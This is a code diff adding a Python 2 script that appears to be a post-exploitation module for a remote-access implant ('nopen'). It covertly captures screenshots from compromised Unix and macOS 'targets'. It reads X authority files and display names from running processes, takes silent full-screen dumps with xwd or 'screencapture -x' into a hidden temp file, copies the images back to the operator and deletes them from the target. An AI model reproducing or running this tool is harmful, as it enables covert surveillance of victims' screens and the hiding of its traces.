@@ -1,0 +1,299 @@
+#!/bin/env python
+import autoutils,sys,re,string,os,time,commands
+from optparse import OptionParser
+
+version = '1.0.0.4'
+
+class screenshot:
+    def __init__(self):
+        self.nopen = autoutils.autoutils()
+        self.options = None
+        self.nopen.connect()
+
+        sys.stdout = sys.stderr
+
+        self.COMMON_BIN_LOCATIONS = ['/usr/bin/', '/usr/local/bin/', '/usr/X11R6/bin/', '/usr/openwin/bin/']
+
+
+    def timestamp(self):
+        return time.strftime("%Y%m%d-%H%M%S", time.localtime())
+
+    def printRed(self, msg):
+        sys.stderr.write("\n%s%s%s\n" % (self.nopen.COLOR_FAILURE, msg, self.nopen.COLOR_NORMAL))    
+
+
+    def launchFirefox(self, path):
+
+        if commands.getoutput('firefox -remote "ping()"').find('No running window found') != -1:  # commands package deprecated in Python 3.x
+            os.popen("firefox " + path +  "&")
+        else:
+            os.popen("firefox -remote \"openFile(file://" + path + ",new-tab)\"") # open a new tab if firefox is already running
+
+        return
+
+    def manualScreenshot(self):
+        xauth = self.options.xauth
+        disp = self.options.disp
+
+        if (xauth == None) or (disp == None) or (xauth == '') or (disp == ''):
+            print "Invalid values... exiting."
+            exit()    
+
+        self.takeFullScreenshot(xauth, disp)
+        # self.pullAllIds(xauth, disp)
+
+        self.launchFirefox(self.pngpath)
+    
+        return
+
+    def autoScreenshot(self):
+
+        # check to see if we're on MacOS X
+        if self.nopen.status['targetos'].find('Darwin') > -1:
+            print "Special, we're on a Mac or something like that ..."
+            self.takeScreenshotMac()
+            return
+
+        o,n,ol = self.nopen.doit("ps -ef | egrep \"(Xorg|X|Xsun)\" | egrep \"\-auth\"")
+        
+        authpatt = re.compile('-auth ([_a-zA-Z0-9:\./-]*)')
+        disppatt = re.compile('(X|Xorg|Xsun) [^:]* ?([0-9a-zA-Z./]*:[0-9]*) ')
+
+        #n,o = self.nopen.doit("xwininfo -root -all | egrep -v \"no name\" | awk '{print $1}' | grep \"0x\"")
+        print "\n"
+        for line in ol:
+            line = line.strip()
+            # print "Processing: " + line    
+            xauth = None
+            disp = None
+            for matchauth in authpatt.finditer(line):
+                xauth = matchauth.group(1)
+                #print 'xauth:'
+                #print xauth
+
+            for matchdisp in disppatt.finditer(line):
+                disp = matchdisp.group(2)
+                #print 'disp:'
+                #print disp
+            
+            if (xauth == None) or (disp == None) or (xauth == '') or (disp == ''):
+                continue
+            else:
+                self.takeFullScreenshot(xauth, disp)
+                # self.pullIds(xauth, disp)
+            
+        self.launchFirefox(self.pngpath)
+    
+        return
+    
+
+    def pullAllIds(self, xauth, disp):
+        prefix = "XAUTHORITY=" + xauth + " DISPLAY=" + disp + " "
+        o,n,ol = self.nopen.doit(prefix + self.pathtoxwininfo + " -root -all | egrep -v \"no name\" | awk '{print $1}' | grep \"0x\"")
+    
+        for id in ol:
+            # print id
+            targetexe = prefix + self.pathtoxwd + " -id " + id 
+            localfile = self.xwdpath + "display" + disp + "-" + id + ".xwd"
+            self.nopen.doit(targetexe + " > L:" + localfile)
+            self.nopen.doit("-lsh cat " + localfile + " | xwdtopnm | pnmtopng > " + localfile.replace("xwd", "png"))
+
+        # Get rid of all 0 byte files
+        self.nopen.doit("-lsh rm -v `find " + self.pngpath + " " + self.xwdpath + " -size 0c`");
+    
+    def takeScreenshotMac(self):
+
+        self.printRed("Taking a screenshot with the following information:")
+        filepath = "/private/tmp/"
+        filename = "."
+
+        # figure out a filename that doesn't exist
+        o = "foo"
+        while o != "":
+            filename += "sc"
+        
+            o,n,ol = self.nopen.doit("-ls " + filepath + filename)
+
+        exe = "screencapture -x -t jpg " + filepath + filename
+        print "COMMAND: " + exe
+        print "Path to screenshot file on target: " + filepath + filename  +" (in case we lose connection)"
+        c = self.nopen.getInput("proceed? [y/N]", default="N")
+
+        if c == "Y" or c == "y":
+            self.nopen.doit("-cd " + filepath)
+            self.nopen.doit(exe)
+            output,nopenoutput,outputlines = self.nopen.doit("-get " + filename)
+            if output != "":
+                self.nopen.doit("-rm " + filename)
+                localfile = self.jpgpath + "/screencapture." + self.timestamp() + ".jpg"
+                self.nopen.doit("-lsh mv " + self.nopen.opdown + "/" + self.nopen.nopen_rhostname + "/" + filepath + filename + " " + localfile)
+                self.launchFirefox(self.jpgpath)
+                print """Successful file collect, see latest file in Firefox directory just popped up:\n\n  """ + localfile
+
+                
+            else:
+                self.nopen.doit("-ls " + filename)
+                print "No valid screen capture, screen is likely asleep"
+            self.nopen.doit("-cdp")
+        return
+
+
+    def takeFullScreenshot(self, xauth, disp):
+        exe = "XAUTHORITY=" + xauth + " DISPLAY=" + disp + " ";
+        exe += self.pathtoxwd
+
+        ssfilename = "full-screenshot-display-" + disp + "." + self.timestamp() + ".xwd"
+
+        self.printRed("Using the following information to take the screenshot:")
+        print "\tXAUTHORITY: [" + xauth + "]"
+        print "\tDISPLAY: [" + disp + "]"
+        print "\tPath to 'xwd' binary: [" + self.pathtoxwd + "]"
+        print "\tPath to 'xwininfo' binary: [" + self.pathtoxwininfo + "]"
+        
+        c = self.nopen.getInput("proceed? [y/N]", default="N")
+
+        if c == "Y" or c =="y":
+            # check for -silent option
+            # silent on by default unless you're on Solaris/SunOS
+
+            if self.nopen.status['targetos'].find('SunOS') != -1:
+                self.options.silent = True
+
+            silentopt = '-silent' if not self.options.silent else ''
+
+            self.nopen.doit(exe + " -root " + silentopt + " > L:" + self.xwdpath + "/" + ssfilename)
+        else:
+            print "...exiting."
+            exit()
+
+        # Check that we got an xwd file
+        o,n,ol = self.nopen.doit("-lsh file " + self.xwdpath + "/" + ssfilename)    
+
+        if ol[0].find("XWD X Window Dump") == -1:
+            self.printRed("ERROR! ERROR! ERROR! ERROR! ERROR! ERROR! ERROR!")
+            print open(self.xwdpath + "/" + ssfilename).read()
+            print "\t...exiting."
+
+            self.nopen.doit("-lsh rm -v " + self.xwdpath + "/" + ssfilename)
+            exit()
+        
+
+        self.nopen.doit("-lsh cat " + self.xwdpath + ssfilename + " | xwdtopnm | pnmtopng > " + self.pngpath + ssfilename + ".png")
+
+
+    def makePaths(self):
+        self.xwdpath = self.nopen.opdown + "/" + "SCREEN_CAPTURE/" + self.nopen.nopen_rhostname + "/xwd/"
+        self.pngpath = self.nopen.opdown + "/" + "SCREEN_CAPTURE/" + self.nopen.nopen_rhostname + "/png/"
+        self.jpgpath = self.nopen.opdown + "/" + "SCREEN_CAPTURE/" + self.nopen.nopen_rhostname + "/jpg/"
+
+
+        self.nopen.doit("-lsh mkdir -pv " + self.pngpath)
+        self.nopen.doit("-lsh mkdir -pv " + self.xwdpath)
+        self.nopen.doit("-lsh mkdir -pv " + self.jpgpath)
+
+        return        
+
+    def searchForBinary(self, binaryName, searchCommonLocations = True):
+    
+        if searchCommonLocations:    
+            locations = (binaryName+" ").join(map(str, self.COMMON_BIN_LOCATIONS)) + binaryName
+        else:
+            locations = binaryName
+
+        o,n,ol = self.nopen.doit("-ls -1 " + locations)
+        if (len(ol) == 0):
+
+            print "\nCouldn't locate " + binaryName + "..."
+            exit()
+
+        return  o.splitlines()[0]              # grab the first match
+
+    def locateExecutables(self):
+        # find the path to xwd and xwininfo binaries
+
+        if not self.options.pathtoxwd:
+            self.pathtoxwd = self.searchForBinary("xwd")
+        else:
+            self.searchForBinary(self.options.pathtoxwd, False)
+            self.pathtoxwd = self.options.pathtoxwd
+
+        if not self.options.pathtoxwininfo:
+            self.pathtoxwininfo = self.searchForBinary("xwininfo")
+        else:
+            self.searchForBinary(self.options.pathtoxwininfo, False)
+            self.pathtoxwininfo = self.options.pathtoxwininfo
+
+#        print "DEBUG:pathtoxwd: " + self.pathtoxwd
+#        print "DEBUG:pathtoxwininfo: " + self.pathtoxwininfo
+
+        return
+
+    def main(self):
+
+        # parsestatus() doesn't get the targetpid correctly, we'll stick with our target pid finder below
+        # gather infos
+        # self.nopen.parsestatus() 
+        #print self.nopen.status
+
+        if not self.parseArgs():
+            return 0
+
+
+        o,nl,ol = self.nopen.doit("-pid")
+        targetpid = o.split()[2]
+
+        self.makePaths()
+        self.locateExecutables()
+
+        print "\n====== Unix Screenshot Capture ======"
+        print "Run this in another window on target if you get into trouble: \n#\t kill -9 " + targetpid
+
+        if (self.options.xauth and self.options.disp):
+            self.manualScreenshot()
+        else:
+            self.autoScreenshot()
+
+        return True
+
+    def parseArgs(self):
+        usage = """usage: -gs screenshot --doit <options>
+--doit    : Automated screenshot (the script will figure out the options for you if you don't specify them below.)
+-X    : XAUTHORITY environment variable (Must also specify -D)
+-D    : DISPLAY environment variable (Must also specify -X)
+-d    : Location of xwd
+-i    : Location of xwininfo
+-s    : DO NOT use "-silent" argument (Some versions of xwd don't have a -silent option, e.g. Solaris). 
+-a    : Pull all id's of a display (IMPLEMENTED BUT NOT USED, might not be necessary)
+-v    : Print version info
+
+-gs screenshot version """ + version + "\n"
+
+        parser = OptionParser()
+        parser.add_option("--doit", dest="doit", action="store_true", default=False, help="Automated screenshot (the script will figure out the options for you if you don't specify them below.)")
+        parser.add_option("-X", dest="xauth", type="string", action="store", help="Set XAUTHORITY environment variable.")
+        parser.add_option("-D", dest="disp", type="string", action="store", help="Set DISPLAY environment variable.")
+        parser.add_option("-d", dest="pathtoxwd", type="string", action="store", help="/path/to/xwd")
+        parser.add_option("-i", dest="pathtoxwininfo", type="string", action="store", help="/path/to/xwininfo")
+        parser.add_option("-s", dest="silent", action="store_true", default=False, help="DO NOT use -silent argument (Some versions of xwd don't have a -silent option, e.g. Solaris)")
+        parser.add_option("-a", dest="pullall", action="store_true", default=False, help="Pull all id's of a display (IMPLEMENTED BUT NOT USED, might not be necessary)")
+        parser.add_option("-v", dest="version", action="store_true", default=False, help="Show version info v." + version)
+
+        (options, args) = parser.parse_args(sys.argv)
+
+        if options.version:
+            print "-gs screenshot version " + version
+            return False
+
+        if not options.doit:
+            print usage
+            return False
+ 
+        if (options.xauth and not options.disp) or (options.disp and not options.xauth):
+            print "Must specify -X with matching -D and vice versa, please try again..."
+            return False
+
+        self.options = options
+
+        return True
+
+screenshot().main()
